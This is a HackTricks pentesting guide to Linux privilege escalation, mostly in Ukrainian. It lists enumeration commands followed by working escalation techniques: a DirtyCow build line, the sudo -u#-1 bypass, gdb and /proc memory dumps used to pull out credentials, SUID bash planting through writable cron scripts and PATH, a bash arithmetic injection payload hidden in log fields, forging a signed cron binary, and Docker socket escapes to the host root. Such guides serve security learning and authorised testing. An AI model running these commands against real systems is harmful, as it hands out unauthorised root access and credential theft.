# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо з отримання відомостей про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Шлях

Якщо ви **маєте права запису в будь-якій папці всередині змінної `PATH`**, ви можете hijack деякі libraries або binaries:
```bash
echo $PATH
```
### Інформація про Env

Чи містять змінні середовища цікаву інформацію, паролі чи API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи є exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Хороший список вразливих kernel та деякі вже **compiled exploits** можна знайти тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де можна знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з цього сайту, ви можете зробити:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконуйте IN victim, лише перевіряє експлойти для kernel 2.x)

Завжди **перевіряйте версію kernel у Google**, можливо ваша версія kernel вказана в якомусь kernel exploit, і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, що наведені в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють непривілейованим локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з директорії, контрольованої користувачем.

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойту переконайтеся, що ваша версія `sudo` вразлива та що вона підтримує функцію `chroot`.

Для додаткової інформації зверніться до оригінального [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: перевірка підпису не вдалася

Перевірте **smasher2 box of HTB** для **прикладу** того, як цю vuln можна експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Більше system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелік можливих засобів захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви всередині docker container, ви можете спробувати втекти з нього:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Перевірте **що змонтовано і що не змонтовано**, де і чому. Якщо щось не змонтовано, ви можете спробувати змонтувати його і перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи встановлено **any compiler is installed**. Це корисно, якщо потрібно використовувати якийсь kernel exploit — рекомендовано compile його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версію встановлених пакетів і сервісів**. Можливо, присутня стара версія Nagios (наприклад), яку можна використати для escalating privileges…\
Рекомендується вручну перевіряти версії найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є доступ по SSH до машини, ви також можете використати **openVAS** для перевірки, чи встановлене всередині машини програмне забезпечення не є застарілим або вразливим.

> [!NOTE] > _Зверніть увагу, що ці команди виведуть багато інформації, яка в більшості випадків буде марною; тому рекомендовано використовувати додатки, такі як OpenVAS або подібні, які перевіряють, чи будь-яка встановлена версія ПЗ є вразливою до відомих exploits_

## Процеси

Перегляньте, які саме **процеси** виконуються і перевірте, чи якийсь процес не має **більше привілеїв, ніж повинен** (наприклад, tomcat запускається від root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте можливі [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарників процесів**, можливо, ви зможете перезаписати чиїсь.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy) для моніторингу процесів. Це може бути дуже корисним для виявлення вразливих процесів, що часто виконуються або коли виконуються певні умови.

### Пам'ять процесу

Деякі сервіси сервера зберігають **credentials in clear text inside the memory**.\
Зазвичай вам потрібні **root privileges** щоб читати пам'ять процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти більше credentials.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, що належать вам**.

> [!WARNING]
> Зверніть увагу, що в наш час більшість машин **не дозволяють ptrace за замовчуванням**, що означає, що ви не можете отримати дамп інших процесів, які належать непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можуть бути відлагоджені, якщо вони мають однаковий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: відлагоджувати можна тільки батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: тільки адміністратор може використовувати ptrace, оскільки потрібна capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жоден процес не може бути трасований ptrace. Після встановлення потрібне перезавантаження для повторного увімкнення трасування.

#### GDB

Якщо у вас є доступ до пам'яті FTP сервісу (наприклад), ви можете отримати Heap і шукати всередині його credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу, **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також вони показують **права доступу кожного відображеного регіону**. Псевдофайл **mem** **надає доступ до самої пам'яті процесу**. З файлу **maps** ми дізнаємося, які **регіони пам'яті доступні для читання** та їхні зсуви. Ми використовуємо цю інформацію, щоб **перейти у файл mem і здампувати всі регіони, доступні для читання, у файл**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам'яті системи, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати через /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише користувачу **root** та групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump — це переосмислення для Linux класичної утиліти ProcDump із набору інструментів Sysinternals для Windows. Отримати його можна за адресою [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб dump пам'ять процесу, можна використовувати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і dump процес, який належить вам
- Script A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам'яті процесу

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump the memory of a process) і шукати credentials всередині memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **викрадати облікові дані у відкритому тексті з пам'яті** and from some **well known files**. It requires root privileges to work properly.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher) що працює як root – веб‑планувальник privesc

Якщо веб‑панель “Crontab UI” (alseambusher/crontab-ui) працює як root і прив'язана лише до loopback, ви все одно можете дістатися до неї через SSH local port-forwarding і створити привілейоване завдання для ескалації.

Типовий ланцюжок
- Виявити порт, доступний тільки на loopback (наприклад, 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - systemd unit, який експонує `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть задачу з високими привілеями і запустіть негайно (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Не запускати Crontab UI від root; обмежте виконання спеціальним користувачем з мінімальними правами
- Прив'язати до localhost та додатково обмежити доступ через firewall/VPN; не використовувати паролі повторно
- Уникати вбудовування секретів у unit files; використовувати secret stores або root-only EnvironmentFile
- Увімкнути audit/logging для on-demand job executions

Перевірте, чи якийсь scheduled job вразливий. Можливо, можна скористатися скриптом, який виконується від root (wildcard vuln? можна модифікувати файли, які використовує root? використовувати symlinks? створити специфічні файли в директорії, яку використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Шлях cron

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Пам'ятайте, що користувач "user" має права запису у /home/user_)

Якщо всередині цього crontab root намагається виконати якусь команду або скрипт без встановленого PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, який використовує скрипт зі wildcard (Wildcard Injection)

Якщо скрипт, що виконується від імені root, містить “**\***” у команді, це можна використати, щоб спричинити небажані наслідки (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає untrusted поля логів і підставляє їх у arithmetic context, attacker може інжектити command substitution $(...), яке виконається як root під час запуску cron.

- Чому це працює: В Bash розгортання відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Отже значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконуючи команду), а потім залишкове цифрове `0` використовується для арифметики, тож скрипт продовжує роботу без помилок.

- Типовий вразливий шаблон:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: Отримайте attacker-controlled текст, записаний у парсований лог так, щоб поле, яке виглядає як число, містило command substitution і закінчувалося цифрою. Переконайтесь, що ваша команда не пише в stdout (або перенаправте її), щоб арифметика залишалась валідною.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, виконуваний від root, використовує **директорію, до якої ви маєте повний доступ**, можливо, варто видалити цю папку і **створити symlink на іншу директорію**, яка міститиме скрипт під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно моніторитиме та перелікуватиме кожен процес, який запускається).

### Невидимі cron jobs

Можна створити cronjob, **поставивши символ повернення каретки після коментаря** (без символу нового рядка), і cronjob працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Сервіси

### Доступні для запису _.service_ файли

Перевірте, чи можете записати будь-який `.service` файл; якщо так, ви **можете змінити його** так, щоб він **запускав** ваш **backdoor коли** сервіс **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться чекати перезавантаження машини).\
Наприклад, створіть ваш backdoor всередині .service файлу за допомогою **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **права запису в бінарні файли, які виконуються сервісами**, ви можете змінити їх на backdoor, щоб коли сервіси будуть виконані повторно, backdoor також виконався.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовує **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-яку з папок цього шляху, ви можете **підвищити привілеї**. Вам потрібно шукати **відносні шляхи, що використовуються у файлах конфігурації сервісів**, таких як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **тим самим ім'ям, що й бінарний файл за відносним шляхом** всередині теки PATH systemd, у яку ви маєте право запису, і коли службу буде запрошено виконати уразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor буде виконаний** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете використати `sudo -l`).

**Learn more about services with `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit файли, чиє ім'я закінчується в `**.timer**`, які контролюють `**.service**` файли або події. **Таймери** можуть використовуватися як альтернатива cron, оскільки вони мають вбудовану підтримку подій календарного часу та монотонних часових подій і можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Записувані таймери

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі об'єкти systemd.unit (наприклад, `.service` або `.target`)
```bash
Unit=backdoor.service
```
> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і над яким ви маєте **права на запис** у **systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтесь більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root та виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу, що **timer** **активується**, створивши символічне посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) дозволяють **обмін повідомленнями між процесами** на тій самій або різних машинах у моделях client-server. Вони використовують стандартні дескрипторні файли Unix для міжкомп'ютерного зв'язку та налаштовуються через `.socket` файли.

Sockets можна конфігурувати за допомогою `.socket` файлів.

**Дізнайтесь більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різні, але узагальнення використовується, щоб **вказати, де буде відбуватися прослуховування** сокета (шлях до AF_UNIX socket файлу, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного вхідного з'єднання створюється **екземпляр service**, і йому передається лише сокет з'єднання. Якщо **false**, всі прослуховуючі сокети **передаються запущеній service unit**, і створюється лише одна service unit для всіх з'єднань. Це значення ігнорується для datagram сокетів і FIFO, де один service unit беззаперечно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони так, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають один або декілька рядків команд, які виконуються відповідно перед або після створення та прив'язки прослуховуючих сокетів/FIFO. Перший токен рядка команди має бути абсолютним шляхом до файлу, після якого йдуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які виконуються відповідно перед або після закриття та видалення прослуховуючих сокетів/FIFO.
- `Service`: Вказує ім'я service unit, яку потрібно активувати при вхідному трафіку. Цей параметр дозволений тільки для сокетів з `Accept=no`. За замовчуванням використовується service з таким самим іменем, як у сокета (з відповідною заміною суфікса). У більшості випадків використання цієї опції не є необхідним.

### Writable .socket files

Якщо ви знайдете записуваний `.socket` файл, ви можете додати на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано до створення сокета. Тому, **ймовірно, вам доведеться зачекати до перезавантаження машини.**\
_Зверніть увагу, що система має використовувати цю конфігурацію socket файлу, інакше backdoor не буде виконано_

### Writable sockets

Якщо ви знайдете будь-який записуваний socket (тут йдеться про Unix Sockets, а не про конфігураційні `.socket` файли), то ви можете спілкуватися з тим socket і, можливо, експлуатувати вразливість.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Сире з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що може бути кілька **sockets, які слухають HTTP-запити** (_я не маю на увазі файли .socket, а файли, що виконують роль unix sockets_). Перевірити це можна за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо сокет **відповідає на HTTP** запит, то ви можете **спілкуватися** з ним і можливо **використати якусь вразливість**.

### Docker socket, доступний для запису

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити container з root-доступом до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна використовувати через Docker API та `curl` команди.

1.  **List Docker Images:** Отримайте список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надішліть запит на створення container, який монтує кореневий каталог системи хоста.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat` для встановлення з'єднання з container, що дозволяє виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після налаштування `socat` з'єднання ви можете виконувати команди безпосередньо в container з root-доступом до файлової системи хоста.

### Інше

Зверніть увагу, що якщо у вас є права запису до Docker socket, оскільки ви перебуваєте в групі **`docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо {**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перевірте **більше способів вийти з docker або зловживати ним для ескалації привілеїв** у:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви виявите, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **ви можете зловживати нею для ескалації привілеїв**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **її можна використати для ескалації привілеїв**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **система міжпроцесної взаємодії (inter-Process Communication, IPC)**, яка дозволяє застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена для сучасних Linux-систем, вона пропонує надійну платформу для різних форм комунікації між застосунками.

Система є універсальною, підтримуючи базові механізми IPC, що покращують обмін даними між процесами, нагадуючи **enhanced UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції між компонентами системи. Наприклад, сигнал від Bluetooth-демона про вхідний дзвінок може змусити музичний плеєр приглушити звук, покращуючи користувацький досвід. Додатково, D-Bus підтримує систему віддалених об'єктів, спрощуючи запити сервісів і виклики методів між застосунками, полегшуючи процеси, які раніше були складними.

D-Bus працює за **моделлю allow/deny**, керуючи дозволами на повідомлення (виклики методів, випромінювання сигналів тощо) на основі кумулятивного ефекту відповідних правил політики. Ці політики визначають взаємодії з шиною, потенційно дозволяючи ескалацію привілеїв через експлуатацію цих дозволів.

